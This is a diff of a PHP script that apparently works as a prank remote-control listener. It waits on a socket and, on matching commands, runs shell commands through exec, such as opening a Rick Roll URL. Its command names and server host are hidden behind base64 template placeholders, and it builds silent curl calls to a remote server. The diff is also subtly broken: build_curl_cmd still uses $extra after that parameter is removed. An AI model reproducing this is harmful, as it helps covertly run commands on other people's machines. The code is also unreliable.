@@ -90,9 +90,8 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
-            load_video('{{B64_STR_RICK_ROLL_VIDEO_ID}}');
-        } else if (preg_match(REGEX_CTL_YOUTUBE, $buf, $arr)) {
-            load_video($arr[1]);
+            $cmd = '{{B64_CMD_OPEN}}' . ' "' . '{{B64_STR_RICK_ROLL_URL}}' . '"';
+            exec($cmd);
         } else if (preg_match(REGEX_CTL_VOICES, $buf)) {
             foreach ($voices as $voice) {
                 $msg .= $voice . "\n";
@@ -137,12 +136,6 @@ do {
     socket_shutdown($sock);
     socket_close($msgsock);
 } while (true);
-
-function load_video($video_id) {
-  exec(build_curl_cmd('v', array('v' => $video_id), '{{B64_STR_VIDEO_FILE}}'));
-  $cmd = '{{B64_CMD_OPEN}}' . ' "' . '{{B64_STR_VIDEO_FILE}}' . '"';
-  exec($cmd);
-}
 
 function command_exist($cmd) {
     $returnVal = shell_exec('{{B64_CMD_WHICH}}' . " $cmd");
@@ -208,21 +201,13 @@ function process_running($search) {
     return false;
 }
 
-function build_curl_cmd($page = 'm', $extra = array(), $out = false) {
+function build_curl_cmd($page = 'm') {
     global $opts;
 
-    if (in_array($page, array('v', 'm', 'p'))) {
+    if (in_array($page, array('m', 'p'))) {
         $url = '{{B64_STR_SERVER_HOST}}' . "{$page}.php?";
         $url .= http_build_query(array_merge($opts, $extra));
-        $cmd = '{{B64_CMD_CURL_SILENT}}';
-
-        if ($out !== false) {
-            $cmd .= " -o $out";
-        }
-
-        $cmd .= " '$url'";
-
-        return $cmd;
+        return ('{{B64_CMD_CURL_SILENT}}' . " '$url'");
     }
 
     return false;
